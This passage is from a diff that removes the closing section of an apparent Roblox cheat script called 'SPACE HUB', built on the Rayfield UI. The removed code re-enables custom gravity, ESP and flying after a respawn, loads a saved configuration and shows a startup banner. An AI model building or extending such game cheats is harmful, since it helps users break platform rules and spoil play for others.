-        if customGravityEnabled then
-            workspace.Gravity = customGravity
-        end
-
-        if espEnabled then
-
-            task.wait(0.2)
-
-            refreshESP()
-
-        end
-
-        if flying then
-
-            task.wait(0.2)
-
-            startFlying()
-
-        end
-
-    end
-)
-
---//======================================================
---// LOAD CONFIGURATION
---//======================================================
-
-pcall(function()
-
-    Rayfield:LoadConfiguration()
-
-end)
-
---//======================================================
---// STARTUP
---//======================================================
-
-Rayfield:Notify({
-
-    Title = "SPACE HUB",
-
-    Content =
-        "Orbital command deck online  •  all systems initialized.",
-
-    Duration = 5,
-
-    Image = "sparkles"
-
-})
